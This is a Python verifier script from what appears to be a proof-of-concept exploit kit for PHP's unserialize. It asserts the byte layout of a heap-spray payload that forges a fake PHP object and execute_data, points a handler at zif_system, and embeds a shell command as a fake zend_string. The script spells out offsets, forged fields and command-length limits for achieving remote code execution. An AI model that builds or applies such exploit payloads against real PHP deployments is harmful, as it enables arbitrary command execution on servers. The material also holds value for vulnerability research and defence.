#!/usr/bin/env python3 -I
"""Structure verifier for fire_zif.py's build_fire_payload (offline; no lab needed).

Asserts the free-arg1 fire envelope: the var_hash spray wrapper (a:N:{...} with
c_part first + spray_count sprays + trailing R:ref) and the forged fake-object /
fake-execute_data bytes inside each spray slot (stale IS_OBJECT bucket zval,
self-referential handlers, num_args, a FREE arg1 pointing at the inline fake
zend_string rather than at the object, get_properties_for=zif_system at
obj_off+gpf_off, and the inline command zend_string). Also the inline-overrun
assertion that caps the command below the handler slot.

    python3 -I poc/primitives/dispatch/verify_fire_zif.py
"""
from __future__ import annotations

import os
import struct
import sys

_HERE = os.path.dirname(os.path.abspath(__file__))
_POC_ROOT = os.path.dirname(os.path.dirname(_HERE))  # poc/
if _POC_ROOT not in sys.path:
    sys.path.insert(0, _POC_ROOT)
from primitives.dispatch import fire_zif as F  # noqa: E402

CE, ZIF, SPRAY = 0x7f0000c0ffee, 0x7f00005a1230, 0x7f0000abc000
SPRAY_LEN, SPRAY_COUNT, GPF = 280, 4, 0xC0
OBJ_OFF, STR_OFF = 0x38, 0xA0
C_PART = 'C:10:"CachedData":3:{i:0;}'
REF_BASE = 4
CMD = b"id>/dev/shm/lcGP"  # 16 B, already over the 14 B libc-fire cap


def q(b, o):
    return struct.unpack_from("<Q", b, o)[0]


def d(b, o):
    return struct.unpack_from("<I", b, o)[0]


def extract_spray(payload, idx, spray_len=SPRAY_LEN):
    """Pull the raw spray buffer out of serialized element i:<idx+1>."""
    tag = ('i:%d;s:%d:"' % (idx + 1, spray_len)).encode()
    p = payload.find(tag)
    assert p >= 0, tag
    start = p + len(tag)
    return payload[start:start + spray_len]


def check(name, cond):
    print(("  ok   " if cond else "  FAIL ") + name)
    return cond


def main():
    ok = True

    pl = F.build_fire_payload(CE, ZIF, SPRAY, CMD, GPF, spray_len=SPRAY_LEN,
                              spray_count=SPRAY_COUNT, c_part=C_PART,
                              ref_base=REF_BASE, obj_off=OBJ_OFF, str_off=STR_OFF)

    print("## envelope structure")
    total = 1 + SPRAY_COUNT + 1
    ok &= check("starts a:%d:{ and ends }" % total,
                pl.startswith(('a:%d:{' % total).encode()) and pl.endswith(b'}'))
    ok &= check("i:0 carries c_part", ('i:0;' + C_PART).encode() in pl)
    ok &= check("spray_count spray parts present",
                pl.count(('s:%d:"' % SPRAY_LEN).encode()) == SPRAY_COUNT)
    ok &= check("trailing R:ref_base", ('R:%d;' % REF_BASE).encode() in pl)

    print("## forged object / execute_data bytes inside a spray slot")
    sp = extract_spray(pl, 0)
    obj = SPRAY + OBJ_OFF
    cmd_ptr = SPRAY + STR_OFF
    ok &= check("len(spray) = spray_len", len(sp) == SPRAY_LEN)
    ok &= check("stale bucket zval.value@40 = spray_addr+obj_off", q(sp, 40) == obj)
    ok &= check("stale bucket zval.type@48 = 0x08 (OBJECT)", d(sp, 48) == 0x08)
    ok &= check("gc refcount@obj_off = 1", d(sp, OBJ_OFF + 0x00) == 1)
    ok &= check("obj.ce@obj_off+0x10 = ce", q(sp, OBJ_OFF + 0x10) == CE)
    ok &= check("obj.handlers@obj_off+0x18 = obj (self-referential)",
                q(sp, OBJ_OFF + 0x18) == obj)
    ok &= check("ex.num_args@obj_off+0x2C = 1", d(sp, OBJ_OFF + 0x2C) == 1)
    ok &= check("ex arg1.value@obj_off+0x50 = spray_addr+str_off", q(sp, OBJ_OFF + 0x50) == cmd_ptr)
    ok &= check("ex arg1.type@obj_off+0x58 = 0x06 (STRING)", d(sp, OBJ_OFF + 0x58) == 0x06)
    ok &= check("handlers[gpf_off=%#x] = zif_system" % GPF, q(sp, OBJ_OFF + GPF) == ZIF)

    print("## free arg1 -- not pinned to the object (the point of this variant)")
    ok &= check("arg1 != object address (free, independently placed)",
                q(sp, OBJ_OFF + 0x50) != obj)

    print("## inline fake zend_string holding the command")
    ok &= check("zstr refcount@str_off = 1", d(sp, STR_OFF + 0x00) == 1)
    ok &= check("zstr type_info@str_off+0x04 = 0x106", d(sp, STR_OFF + 0x04) == 0x106)
    ok &= check("zstr h@str_off+0x08 = 0", q(sp, STR_OFF + 0x08) == 0)
    ok &= check("zstr len@str_off+0x10 = len(cmd)", q(sp, STR_OFF + 0x10) == len(CMD))
    ok &= check("cmd bytes@str_off+0x18", bytes(sp[STR_OFF + 0x18:STR_OFF + 0x18 + len(CMD)]) == CMD)
    ok &= check("NUL after command", sp[STR_OFF + 0x18 + len(CMD)] == 0)

    print("## inline command capped below the handler slot")
    cap = (OBJ_OFF + GPF) - STR_OFF - 0x18 - 1  # 63 on 8.4.26 (gpf 0xC0)
    ok &= check("largest fitting command accepted (%d B)" % cap,
                _accepts(b"X" * cap))
    ok &= check("one byte over cap raises AssertionError (%d B)" % (cap + 1),
                not _accepts(b"X" * (cap + 1)))

    print("\n==== verify_fire_zif: %s ====" % ("PASS" if ok else "FAIL"))
    return 0 if ok else 1


def _accepts(cmd):
    try:
        F.build_fire_payload(CE, ZIF, SPRAY, cmd, GPF, spray_len=SPRAY_LEN,
                             spray_count=SPRAY_COUNT, c_part=C_PART,
                             ref_base=REF_BASE, obj_off=OBJ_OFF, str_off=STR_OFF)
        return True
    except AssertionError:
        return False


if __name__ == "__main__":
    raise SystemExit(main())
